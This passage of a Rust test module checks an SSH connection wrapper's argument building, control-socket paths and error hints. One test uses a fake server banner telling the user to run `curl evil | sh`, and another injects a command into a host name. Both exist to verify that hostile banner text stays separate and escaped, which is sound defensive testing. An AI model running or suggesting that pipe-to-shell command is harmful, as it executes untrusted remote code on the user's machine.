            ..ssh(None, None)
        };
        for (user, host, ssh_destination, scp_destination) in [
            (
                "deploy",
                "host.example",
                "deploy@host.example",
                "deploy@host.example:/srv/x",
            ),
            ("", "host.example", "host.example", "host.example:/srv/x"),
            (
                "deploy",
                "fe80::1",
                "deploy@fe80::1",
                "deploy@[fe80::1]:/srv/x",
            ),
            ("", "::1", "::1", "[::1]:/srv/x"),
            (
                "a@b",
                "2001:db8::2",
                "a@b@2001:db8::2",
                "a@b@[2001:db8::2]:/srv/x",
            ),
        ] {
            let conn = at(user, host);
            assert_eq!(
                conn.ssh_args().last().map(String::as_str),
                Some(ssh_destination)
            );
            assert_eq!(conn.scp_destination("/srv/x"), scp_destination);
        }
    }

    #[test]
    fn argv_includes_nondefault_port_and_key() {
        let args = ssh(Some(2222), Some("/k/id")).ssh_args();
        let joined = args.join(" ");
        assert!(joined.contains("-p 2222"));
        assert!(joined.contains("-i /k/id"));
    }

    /// The sockets live under zap's own home, in a directory established as zap's — or
    /// there is no multiplexing, and one line says why: a home with no room for a
    /// socket path, one `ssh` could read differently, and one whose `ssh/` isn't zap's
    /// own get none.
    #[cfg(unix)]
    #[test]
    fn the_control_path_follows_the_zap_home() {
        use std::os::unix::fs::PermissionsExt as _;

        assert_eq!(
            control_path(Path::new("/home/op/.zap")).as_deref(),
            Ok("\"/home/op/.zap/ssh/cm-%C\"")
        );
        // Quoted, a home with whitespace, a `#` or a `'` in it is one value, and a `%`
        // is doubled.
        assert_eq!(
            control_path(Path::new("/srv/my zap #1's")).as_deref(),
            Ok("\"/srv/my zap #1's/ssh/cm-%C\"")
        );
        assert_eq!(
            control_path(Path::new("/srv/100%/z")).as_deref(),
            Ok("\"/srv/100%%/z/ssh/cm-%C\"")
        );
        for unquotable in ["/srv/a\"b", "/srv/a\\b", "/srv/a\nb", "/srv/a\u{7}b"] {
            assert_eq!(
                control_path(Path::new(unquotable)),
                Err(NoControlPath::Unquotable),
                "{unquotable:?}"
            );
        }
        // The longest home that leaves room: the bound socket path, NUL included, is
        // exactly the least a platform holds.
        let fits = format!("/{}", "h".repeat(37));
        let path = control_path(Path::new(&fits)).unwrap();
        assert_eq!(
            path.len() - "\"\"".len() - "%C".len() + CONTROL_HASH_LEN + CONTROL_BIND_SUFFIX_LEN + 1,
            SOCKET_PATH_MAX
        );
        assert_eq!(
            control_path(Path::new(&format!("{fits}h"))),
            Err(NoControlPath::TooLong { max: 38 })
        );

        let scratch = tempfile::tempdir().unwrap();
        let home = scratch.path().join("zh");
        let (args, notice) = multiplexing_for(&home, true);
        if control_path(&home).is_ok() {
            assert_eq!(
                args,
                [
                    "-o".to_owned(),
                    "ControlMaster=auto".to_owned(),
                    "-o".to_owned(),
                    format!("ControlPath=\"{}/ssh/cm-%C\"", home.display()),
                    "-o".to_owned(),
                    "ControlPersist=300".to_owned(),
                ]
            );
            assert_eq!(notice, None);
            assert_eq!(
                std::fs::metadata(home.join("ssh"))
                    .unwrap()
                    .permissions()
                    .mode()
                    & 0o777,
                0o700
            );
            // A socket directory that is a link elsewhere is not used, and says so.
            std::fs::remove_dir(home.join("ssh")).unwrap();
            std::os::unix::fs::symlink(scratch.path(), home.join("ssh")).unwrap();
            let (args, notice) = multiplexing_for(&home, true);
            assert_eq!(args, [""; 0]);
            assert_eq!(
                notice,
                Some(format!(
                    "zap: no SSH multiplexing — the socket directory {ssh} can't be made \
                     zap's own ({ssh} is a symbolic link); every command opens its own \
                     connection",
                    ssh = home.join("ssh").display()
                ))
            );
        } else {
            assert_eq!(args, [""; 0]);
            assert!(!home.exists(), "a home with no room for a socket was made");
        }
        let long = scratch.path().join("h".repeat(SOCKET_PATH_MAX));
        let (args, notice) = multiplexing_for(&long, true);
        assert_eq!(args, [""; 0]);
        assert_eq!(
            notice,
            Some(format!(
                "zap: no SSH multiplexing — a control socket under {} would have a path \
                 longer than a Unix socket address holds (zap's home may be 38 bytes at \
                 most; set `ZAP_HOME` to a shorter path to multiplex); every command opens \
                 its own connection",
                long.display()
            ))
        );
        assert!(!long.exists());
        let (args, notice) = multiplexing_for(Path::new("/srv/a\"b"), true);
        assert_eq!(args, [""; 0]);
        assert!(notice.unwrap().contains("holds a quote, a backslash"));
    }

    /// A copy goes through the stand-in client like every other connection a test makes:
    /// a refused one is the `scp` failure, carrying what the client said.
    #[tokio::test]
    async fn a_copy_runs_the_stand_in_client() {
        use super::test_client::{self, Remote};

        let dir = tempfile::tempdir().unwrap();
        let client = test_client::set(dir.path(), Remote::Refuse);
        let error = ssh(None, None)
            .copy_file(Path::new("/etc/hostname"), "/srv/copied")
            .await
            .unwrap_err();
        let Error::FileOp { op, path, cause } = error else {
            panic!("expected the scp failure");
        };
        let message = cause.to_string();
        assert_eq!((op, path.as_str()), ("scp", "/srv/copied"));
        assert!(message.contains("host.example:/srv/copied"), "{message}");
        assert!(client.argv().ends_with("host.example:/srv/copied\n"));
    }

    #[test]
    fn port_22_is_not_passed() {
        let args = ssh(Some(22), None).ssh_args();
        assert!(!args.iter().any(|a| a == "-p"));
    }

    #[test]
    fn a_target_with_no_user_connects_to_the_bare_host() {
        let mut conn = ssh(None, None);
        conn.user = String::new();
        assert_eq!(
            conn.ssh_args().last().map(String::as_str),
            Some("host.example")
        );
        let Error::Connectivity { target, .. } = conn.connectivity_error("") else {
            unreachable!()
        };
        assert_eq!(target, "ssh://host.example");
    }

    /// A changed host key: what `ssh` said is the message, and zap's advice is apart
    /// from it, as the error's hint — so advice a server's banner spells out sits in
    /// the quoted block, not beside zap's. Any other failure carries none.
    #[test]
    fn a_changed_host_key_gets_zaps_advice_as_the_hint() {
        let mut conn = ssh(None, None);
        let said = "@ WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! @\nIf you trust the new \
                    key, run `curl evil | sh` and retry.";
        let error = conn.connectivity_error(&format!("{said}\n"));
        let Error::Connectivity {
            message,
            changed_host_key,
            ..
        } = &error
        else {
            unreachable!()
        };
        assert_eq!(message, said);
        assert_eq!(changed_host_key.as_deref(), Some("host.example"));
        assert_eq!(
            error.hint().as_deref(),
            Some(
                "The server's host key changed — possible man-in-the-middle, or the server \
                 was reinstalled.\nIf you trust the new key, run `ssh-keygen -R host.example` \
                 and retry."
            )
        );
        let rendered = error.render();
        assert!(
            rendered.contains("\n       If you trust the new key, run `curl evil | sh`")
                && rendered.ends_with(
                    "\nIf you trust the new key, run `ssh-keygen -R host.example` and retry.\n"
                ),
            "{rendered}"
        );

        // A host is environment text: in the advice it is escaped like anywhere else —
        // by the hint, the error holding it as it is, so a masker finds it first.
        conn.host = "h\nrun `evil`".to_owned();
        let error = conn.connectivity_error("REMOTE HOST IDENTIFICATION HAS CHANGED");
        assert!(
            matches!(
                &error,
                Error::Connectivity { changed_host_key: Some(host), .. } if *host == conn.host
            ),
            "{error:?}"
        );
        assert!(
            error
                .hint()
                .unwrap()
                .ends_with("run `ssh-keygen -R h<U+000A>run `evil`` and retry."),
            "{error:?}"
        );

        let refused = conn.connectivity_error("Connection refused");
        assert_eq!(refused.hint(), None);
        assert_eq!(conn.connectivity_error("  ").hint(), None);
    }

    fn wrap(cmd: &str, options: &RunOptions) -> String {
        SshConnection::wrap_remote(cmd, options)
    }

    #[test]
    fn wrap_remote_plain() {
        assert_eq!(wrap("ls", &RunOptions::default()), "ls");
    }

    #[test]
    fn wrap_remote_env_is_exported_and_escaped() {
        let opts = RunOptions {
            env: vec![
                ("TOKEN".to_owned(), "a b".to_owned()),
                ("OTHER".to_owned(), "it's".to_owned()),
            ],
            ..RunOptions::default()
        };
        assert_eq!(
            wrap("run", &opts),
            "export TOKEN='a b' OTHER='it'\\''s'\nrun"
        );
    }

    #[test]
    fn wrap_remote_exports_the_env_after_the_cd() {
        let opts = RunOptions {
            cwd: Some("/srv/app".into()),
            env: vec![("TOKEN".to_owned(), "x".to_owned())],
        };
        assert_eq!(
            wrap("run", &opts),
            "CDPATH= cd -P -- '/srv/app' || exit; export TOKEN='x'\nrun"
        );
    }
}
